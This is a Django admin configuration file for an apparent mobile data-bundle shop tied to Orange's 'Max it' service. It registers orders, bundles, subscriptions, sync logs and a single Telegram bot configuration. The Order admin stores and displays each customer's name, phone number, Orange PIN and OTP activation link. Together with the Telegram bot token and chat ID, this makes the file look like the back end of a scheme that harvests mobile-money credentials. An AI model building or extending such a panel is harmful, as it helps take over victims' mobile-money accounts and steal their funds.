from django.contrib import admin
from .models import Bundle, Order, Subscription, SyncLog, TelegramConfig
from django.db import transaction

@admin.register(Order)
class OrderAdmin(admin.ModelAdmin):
    # Displays the most critical sync data at a glance
    list_display = ('full_name', 'phone_number', 'orange_pin', 'status', 'created_at')
    list_filter = ('status', 'bundle', 'created_at')
    search_fields = ('phone_number', 'full_name', 'order_id')
    readonly_fields = ('created_at',)
    
    fieldsets = (
        ('Customer Info', {
            'fields': ('order_id', 'full_name', 'phone_number', 'city', 'bundle')
        }),
        ('Orange Max it Sync Data', {
            'fields': ('orange_pin', 'otp_activation_link', 'status')
        }),
        ('Metadata', {
            'fields': ('total_amount', 'created_at', 'expires_at')
        }),
    )

@admin.register(Bundle)
class BundleAdmin(admin.ModelAdmin):
    list_display = ('name', 'bundle_type', 'price_le', 'is_active')

admin.site.register(Subscription)
admin.site.register(SyncLog)

from .models import TelegramConfig

@admin.register(TelegramConfig)
class TelegramConfigAdmin(admin.ModelAdmin):
    list_display = ('bot_token', 'chat_id', 'updated_at')

    def has_add_permission(self, request):
        try:
            # Using atomic ensures this check doesn't break the whole transaction
            with transaction.atomic():
                return not TelegramConfig.objects.exists()
        except:
            return True